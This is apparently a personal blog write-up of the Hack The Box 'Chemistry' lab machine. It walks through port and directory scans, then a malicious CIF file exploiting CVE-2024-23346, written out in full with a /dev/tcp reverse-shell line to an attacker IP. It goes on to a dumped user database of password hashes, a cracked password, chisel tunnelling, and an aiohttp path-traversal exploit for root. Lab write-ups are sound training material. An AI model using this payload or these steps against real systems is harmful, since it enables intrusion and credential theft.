---
date: 2025-02-13
linktitle: Chemistry-HTB
title: HTB Chemistry - 🐧
showreadingtime: true
tags: ['HTB']
categories: ['HTB']
---

# Enumeration

nmap
```
nmap -sC -sV -A -T4 -Pn 10.10.11.38
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 16:02 IST
Nmap scan report for 10.10.11.38
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Thu, 13 Feb 2025 10:32:24 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=2/13%Time=67ADCA35%P=aarch64-unknown-linux
SF:-gnu%r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\
SF:.0\.3\x20Python/3\.9\.5\r\nDate:\x20Thu,\x2013\x20Feb\x202025\x2010:32:
SF:24\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Le
SF:ngth:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYP
SF:E\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20cha
SF:rset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=
SF:\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>
SF:Chemistry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"styleshe
SF:et\"\x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x2
SF:0\n\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20
SF:class=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"ti
SF:tle\">Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<p>Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20
SF:tool\x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic
SF:\x20Information\x20File\)\x20and\x20analyze\x20the\x20structural\x20dat
SF:a\x20contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x2
SF:0class=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<c
SF:enter><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"bt
SF:n\">Register</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20
SF:\x20\x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x
SF:20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\
SF:x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=
SF:\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</
SF:head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Erro
SF:r\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x
SF:20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20reques
SF:t\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad
SF:\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x2
SF:0\x20</body>\n</html>\n");
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   213.59 ms 10.10.14.1
2   214.23 ms 10.10.11.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.95 seconds

```

Gobuster:
```
gobuster dir -u "http://10.10.11.38:5000" -w ~/Downloads/D31ty/kali-wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.38:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/manavallan/Downloads/D31ty/kali-wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 926]
/register             (Status: 200) [Size: 931]
/upload               (Status: 405) [Size: 153]
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/dashboard            (Status: 302) [Size: 235] [--> /login?next=%2Fdashboard]
```

Apart from basic directory didn't find anything. Right of the bat, I found the CIF file contents are vulnerable to RCE and any command sent there are executed => `CVE-2024-23346`

So uploaded the file and got RCE and reverse shell. 
```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.45/7878 0>&1\'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Got access to shell

>app@chemistry:~$ cat /etc/passwd | grep "/bin/bash"
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
app@chemistry:~$ 


![[Screenshot 2025-02-13 at 16.23.52.png]]

Found password in app.py
Database details:
```
app@chemistry:~$ cat instance/database.db
cat instance/database.db
�f�K�ytableuseruserCREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
)';indexsqlite_autoindex_user_1user�3�5tablestructurestructureCREATE TABLE structure (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        filename VARCHAR(150) NOT NULL,
        identifier VARCHAR(100) NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id),
        UNIQUE (identifier)
����5#Uexample.cifbfe7cfaf-72fb-48b2-8cf4-029a35571ffe5#Uexample.cif079287db-f921-4990-82a3-769a82f1bbda
Maxel9347f9724ca083b17e39555c36fd9007*1ffe'U    079287db-f921-4990-82a3-769a82f1bkristel6896ba7b11a62cacffbdaded457c6d92(
eusebio6cad48078d0241cca9a7b322ecd073b3)abian4e5Mtaniaa4aa55e816205dc0389591c9f82f43bbMvictoriac3601ad2286a4293868ec2a4bc606ba3)Mpeter6845c17d298d95aa942127bdad2ceb9b*Mcarlos9ad48828b0955513f7cf0f7f6510c8f8*Mjobert3dec299e06f7ed187bac06bd3b670ab2*Mrobert02fcf7cfc10adc37959fb21f06c6b467(Mrosa63ed86ee9f624c7b14f1d4f43dc251a5'Mapp197865e46b878d9e74a0346b6d59886a)Madmin2861debaf8d99436a10ed6f75a252abf
Y��x�Y����lc�����_�     dummlily
                                risteaxel
fabian

      elacia

            usebio
        tania
                victoriapeter
carlos
jobert
roberrosaapp    
```

![[Screenshot 2025-02-13 at 16.45.11.png]]

```
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|lily|89f288757f4d0693c99b007855fc075e
16|dummy|5f4dcc3b5aa765d61d8327deb882cf99

```


![[Screenshot 2025-02-13 at 16.45.55.png]]

rosa:unicorniosrosados

same creds for ssh of rosa. 

## Privilege Escalation 
Ran linpeas and found this: 
![[Screenshot 2025-02-13 at 16.58.03.png]]

```
chisel server --socks5 --reverse -p 4567
```
```
./chisel client --fingerprint tvSNnW2bts0cgMN2qFAImAWnSw0D1Unh2LPKECM1OmU= 10.10.14.45:4567 R:1234:127.0.0.1:8080
```

![[Screenshot 2025-02-13 at 16.59.52.png]]


Here when I checked the request, I found the server version:
`Python/3.9 aiohttp/3.9.1`

SO this vulnerability POC found on git: https://github.com/z3rObyte/CVE-2024-23334-PoC

It worked well. There is a catch, hope you could find it before running the script. 
![[Screenshot 2025-02-13 at 17.19.07.png]]


Okay, the system seems to run the localhost application in root. 

![[Screenshot 2025-02-13 at 17.20.07.png]]

Now I directly got the flag :) 

Root flag: 74c7f98bd23cfdfaacae1f4e0946b07f

![[Screenshot 2025-02-13 at 17.20.52.png]]